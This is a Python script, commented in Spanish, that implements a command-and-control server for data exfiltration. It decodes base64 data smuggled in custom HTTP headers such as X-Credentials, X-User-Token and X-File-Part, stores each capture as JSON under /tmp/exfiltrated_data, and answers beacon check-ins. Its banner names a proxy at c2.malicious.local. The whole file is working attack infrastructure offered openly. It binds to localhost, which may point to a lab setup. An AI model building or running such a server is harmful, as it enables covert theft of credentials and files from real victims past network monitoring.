#!/usr/bin/env python3
"""
C2 Server - Receptor de datos exfiltrados vía HTTP/2 headers
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import base64
import json
import datetime
import os

class C2Handler(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        """Log personalizado"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {format % args}")
    
    def do_POST(self):
        """Recibir datos exfiltrados"""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8')
        
        # Extraer headers personalizados
        exfil_data = {
            'timestamp': datetime.datetime.now().isoformat(),
            'source_ip': self.client_address[0],
            'headers': dict(self.headers),
            'body': body
        }
        
        # Headers personalizados donde se ocultan datos
        sensitive_headers = [
            'X-Session-ID', 'X-User-Token', 'X-Data-Chunk',
            'X-File-Part', 'X-Credentials', 'X-System-Info',
            'X-Custom-Meta', 'X-Encrypted-Payload'
        ]
        
        print("\n" + "="*60)
        print("DATOS EXFILTRADOS RECIBIDOS")
        print("="*60)
        
        # Decodificar datos ocultos en headers
        for header in sensitive_headers:
            if header in self.headers:
                encoded_data = self.headers[header]
                try:
                    decoded = base64.b64decode(encoded_data).decode('utf-8')
                    print(f"\n[HEADER] {header}:")
                    print(f"  Raw: {encoded_data[:50]}...")
                    print(f"  Decoded: {decoded}")
                    exfil_data[header] = decoded
                except Exception as e:
                    print(f"  Error decodificando {header}: {e}")
        
        # Guardar en archivo
        output_dir = "/tmp/exfiltrated_data"
        os.makedirs(output_dir, exist_ok=True)
        
        filename = f"{output_dir}/exfil_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(exfil_data, f, indent=2)
        
        print(f"\n[GUARDADO] {filename}")
        print("="*60 + "\n")
        
        # Respuesta al cliente
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status":"received"}')
    
    def do_GET(self):
        """Beacon/heartbeat"""
        if self.path == '/beacon':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'ACTIVE')
        else:
            self.send_response(404)
            self.end_headers()

def run_server(port=8000):
    server_address = ('127.0.0.1', port)
    httpd = HTTPServer(server_address, C2Handler)
    print(f"""
    ╔══════════════════════════════════════════════════════════╗
    ║          C2 SERVER - HTTP/2 EXFILTRATION                ║
    ║                                                          ║
    ║  Listening on: http://127.0.0.1:{port}                 ║
    ║  Nginx Proxy:  https://c2.malicious.local/exfil        ║
    ║                                                          ║
    ║  Waiting for exfiltrated data...                        ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
